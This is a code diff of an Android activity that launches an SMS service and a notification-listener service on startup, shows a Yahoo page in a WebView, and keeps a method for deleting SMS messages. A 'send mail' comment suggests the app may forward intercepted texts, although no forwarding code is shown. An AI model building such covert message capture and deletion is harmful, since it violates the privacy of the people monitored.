@@ -1,22 +1,17 @@
 package geosat.mysys;
 
-import android.app.Activity;
-import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.StrictMode;
-import android.telephony.SmsManager;
+import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.TextView;
 
-import java.util.Calendar;
-
-public class BroadCastActivity2_SMS extends Activity {
+public class BroadCastActivity2_SMS extends AppCompatActivity {
     WebView webView;
 
     @Override
@@ -33,12 +28,10 @@ public class BroadCastActivity2_SMS extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_bc2_sms);
 
-        Intent it = new Intent(this, SmsService.class);
-        it.putExtra("type", "Activity");
-        startService(it);       // startService
-        //context.stopService(it);        // stopService
+        startNotificationService();
 
-
+        // send mail
+        startSmsService();
 
         WebViewClient mWebViewClient = new WebViewClient() {
             @Override
@@ -51,22 +44,23 @@ public class BroadCastActivity2_SMS extends Activity {
         webView.setWebViewClient(mWebViewClient);
         webView.loadUrl("http://tw.yahoo.com");
 
-        Intent intent = getIntent();
-        if (intent != null) {
-            String address = intent.getStringExtra("sms_address");
 
-            if (address != null) {
-
-                //textView.append("\n\n發件人：\n" + address);
-                String bodyString = intent.getStringExtra("sms_body");
-                if (bodyString != null) {
-                    //textView.append("\n短信内容：\n" + bodyString);
-                }
-            }
-        }
 
     }
 
+
+    private void startSmsService(){
+        Intent it = new Intent(this, SmsService.class);
+        it.putExtra("type", "Activity");
+        startService(it);       // startService
+        //context.stopService(it);        // stopService
+    }
+
+    private void startNotificationService(){
+        Intent it = new Intent(this, NotificationListener.class);
+        startService(it);
+
+    }
 
     public void deleteSMS(Context context, String message, String number) {
         try {
